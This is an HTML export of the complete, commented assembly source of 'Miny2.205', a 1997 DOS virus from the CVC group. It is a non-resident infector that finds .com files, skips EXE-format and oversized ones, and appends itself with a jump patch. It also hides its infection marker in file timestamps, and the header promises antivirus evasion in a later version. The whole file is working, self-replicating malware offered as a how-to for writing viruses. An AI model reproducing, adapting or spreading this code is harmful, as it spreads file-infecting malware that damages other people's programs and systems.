<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Exported from Notepad++</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;                                                               CVC #02  97/09</span><span class="sc0">
</span><span class="sc1">; Virus Name : Miny2.205 (Type C)</span><span class="sc0">
</span><span class="sc1">; Author : Osiris</span><span class="sc0">
</span><span class="sc1">; Group : CVC</span><span class="sc0">
</span><span class="sc1">; Date : 1997/08/17</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Type : Non-resident COM infector</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Miny2 (Type B) 의 개선판이다.</span><span class="sc0">
</span><span class="sc1">; COM 확장자를 가진 EXE 파일을 감염 시키지 않는다.</span><span class="sc0">
</span><span class="sc1">; 방법은 EXE 파일은 첫부분이 MZ 를 가지므로 해당파일이 MZ 로 시작하면 감염시</span><span class="sc0">
</span><span class="sc1">; 키지 않는다. 그외 64 KB 이상의 길이를 가지는 파일도 감염 시키지 않는다.</span><span class="sc0">
</span><span class="sc1">; COM 파일은 하나의 세그먼트만 존재하기 때문에 64 KB 이상의 파일은 존재 할 수</span><span class="sc0">
</span><span class="sc1">; 없다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; EXE 파일은 COM 파일과는 파일구조가 틀리기 때문에 감염시키기 위해서는 또</span><span class="sc0">
</span><span class="sc1">; 다른 방법이 필요하다. 그런데 일부 EXE 파일은 COM 확장자를 가진 경우가 있다.</span><span class="sc0">
</span><span class="sc1">; (예:COMMAND.COM)</span><span class="sc0">
</span><span class="sc1">; 많은 바이러스들이 윈도우 95에서 작동을 제대로 못하는 이유중 하나가 COMMAND.</span><span class="sc0">
</span><span class="sc1">; COM 을 COM 형식으로 감염시켜서 파일 구조를 깨버리는 때문이다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; 역시 많은 AV 들에게 진단이 된다. 하지만, Miny2 의 목적은 비상주 기생형 바이러</span><span class="sc0">
</span><span class="sc1">; 스 제작법이기 때문에 아직은 진단을 피하기 위한 방법을 사용하지 않았다.</span><span class="sc0">
</span><span class="sc1">; Type D 부터 TBAV 의 인공지능을 피하는 바이러스를 제작하겠다.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;&lt;&gt;</span><span class="sc0">
            </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
            </span><span class="sc9">.CODE</span><span class="sc0">

 </span><span class="sc5">Miny2</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 쓰레기값 (아무일도 안한다.)</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 앞부분 복구시 바이러스가 파괴되기</span><span class="sc0">
            </span><span class="sc6">nop</span><span class="sc0">                         </span><span class="sc1">; 때문에 이 값을 넣었다.</span><span class="sc0">
 </span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">Next</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Next</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Next</span><span class="sc0">        </span><span class="sc1">; BP = 바이러스 시작지점</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">COM_head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">100h</span><span class="sc0">               </span><span class="sc1">; COM 의 앞부분을 복구한다.</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">di</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsw</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">movsb</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; DTA 로 사용해 PSP 가 파괴되므로</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">              </span><span class="sc1">; 잠시 저장한다.</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Eh</span><span class="sc0">                </span><span class="sc1">; 파일 찾기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">00100011B</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">Match_COM</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc5">Find</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jnc</span><span class="sc0">   </span><span class="sc5">ChkInfected</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">Restart</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc5">End_Virus</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; 원래 DTA 복구</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0080h</span><span class="sc0">
            </span><span class="sc6">repz</span><span class="sc0">  </span><span class="sc6">movsb</span><span class="sc0">
            </span><span class="sc6">RET</span><span class="sc0">

 </span><span class="sc5">ChkInfected</span><span class="sc4">:</span><span class="sc0">                           </span><span class="sc1">; 감염 여부를 확인한다.</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0096h</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">; 62 초 인지 검사한다.</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1Fh</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">Infect</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4Fh</span><span class="sc0">                </span><span class="sc1">; 다음 파일 찾기</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Find</span><span class="sc0">
 </span><span class="sc5">Infect</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4301h</span><span class="sc0">              </span><span class="sc1">; 읽기/쓰기 속성으로 바꿈</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">009Eh</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">               </span><span class="sc1">; 에러시 파일 닫기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3D02h</span><span class="sc0">              </span><span class="sc1">; 파일 오픈</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jc</span><span class="sc0">    </span><span class="sc5">Restart</span><span class="sc0">               </span><span class="sc1">; 혹시 모를 오픈시 에러도 처리했다.</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">                 </span><span class="sc1">; 파일 핸들 얻기</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5700h</span><span class="sc0">              </span><span class="sc1">; 파일 작성 시간 얻기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">; 작성 시간 저장</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Fh</span><span class="sc0">                </span><span class="sc1">; 앞부분 읽기</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">; 버퍼 주소</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">               </span><span class="sc1">; 3 바이트</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0"> </span><span class="sc1">; MZ 인가 ?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">lseek2</span><span class="sc0">                </span><span class="sc1">; TBAV 에 진단안되기 위해서 따로 검사</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0">   </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">COM_Head</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0"> </span><span class="sc1">; 한다.</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc10">Error</span><span class="sc0">
 </span><span class="sc5">lseek2</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">02</span><span class="sc0">                 </span><span class="sc1">; 파일 끝으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">                 </span><span class="sc1">; 64 KB 이상인가 ?</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc10">Error</span><span class="sc0">                 </span><span class="sc1">; 다음 검사때 오픈 시키지 않기위해서</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">                  </span><span class="sc1">; 점프값 계산</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; 바이러스 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">End_virus</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">start</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">                 </span><span class="sc1">; 처음으로 이동</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">  </span><span class="sc5">lseek</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">                </span><span class="sc1">; 점프 코드 쓰기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0003</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc5">JumpCode</span><span class="sc4">[</span><span class="sc8">BP</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc0">                    </span><span class="sc1">; 파일 작성 시간 복구</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">or</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc4">,+</span><span class="sc2">1Fh</span><span class="sc0">               </span><span class="sc1">; 62 초로 만들기</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">5701h</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">

 </span><span class="sc5">Close</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">3Eh</span><span class="sc0">                </span><span class="sc1">; 파일 닫기</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">Restart</span><span class="sc0">

 </span><span class="sc5">lseek</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">; 포인터 이동</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0">   </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0">   </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">42h</span><span class="sc0">
            </span><span class="sc6">int</span><span class="sc0">   </span><span class="sc2">21h</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

 </span><span class="sc5">COM_head</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0CDh</span><span class="sc4">,</span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">90h</span><span class="sc0">          </span><span class="sc1">; COM 앞부분</span><span class="sc0">
 </span><span class="sc5">Match_COM</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'*.com'</span><span class="sc4">,</span><span class="sc2">00</span><span class="sc0">            </span><span class="sc1">; COM 파일 찾기</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc12">'Miny2'</span><span class="sc0">               </span><span class="sc1">; 미니 2</span><span class="sc0">
 </span><span class="sc5">JumpCode</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc2">0E9h</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">    </span><span class="sc10">?</span><span class="sc4">,</span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">End_Virus</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">END</span><span class="sc0">   </span><span class="sc5">Miny2</span><span class="sc0">

</span></div></body>
</html>
